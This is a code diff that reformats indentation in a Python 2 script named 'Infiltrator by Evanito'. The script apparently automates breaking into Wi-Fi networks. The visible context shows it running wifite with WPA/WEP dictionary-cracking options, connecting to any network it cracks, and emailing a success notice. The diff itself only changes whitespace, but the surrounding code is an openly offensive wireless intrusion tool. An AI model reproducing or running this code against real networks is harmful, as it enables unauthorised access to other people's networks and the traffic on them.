@@ -46,19 +46,19 @@ time_now = time.strftime("%I:%M:%S")
 if args.background:
     sys.stdout = open('%s/logs/%s_infiltrator.log' %(path, time_now), 'w')
 if args.iface:
-	interface = args.iface
+    interface = args.iface
 if args.test:
     test_mode = True
 if args.address:
-	toaddrs = args.address
+    toaddrs = args.address
 if args.username:
-	username = args.username
+    username = args.username
 if args.password:
-	pwd = args.password
+    pwd = args.password
 if args.wpaattack:
-	wpa_attack = True
+    wpa_attack = True
 if args.dictionary:
-	dictionary = args.dictionary
+    dictionary = args.dictionary
 
 print "Infiltrator by Evanito\n\nStarted, checking for internet..."
 
@@ -140,7 +140,7 @@ def send_email():
         server.quit()
         print 'Sent!'
     else:
-		print "Email requirements not defined. Not sending success email."
+        print "Email requirements not defined. Not sending success email."
 
 def crosscheck():
     networks = populate_known()
@@ -196,10 +196,10 @@ if crosschecked[0] == False:
                 raise SystemExit
     if gotem == False and wpa_attack == True:
         subprocess.call(["sudo", "wifite", '-crack', '-dict', dictionary, '-pow', '35', '-mac', "-i", interface, '-quiet', '-wpadt', '30', '-strip', '-aircrack', '-wpa', '-wep'])	
-		for ap in ap_list:
+        for ap in ap_list:
             if ap in populate_known():
                 print "Cracked one."
-			    crosschecked = crosscheck()
+                crosschecked = crosscheck()
                 gotem = True
                 connect_wifi(interface, crosschecked[1], crosschecked[2])
                 if is_connected() == True:
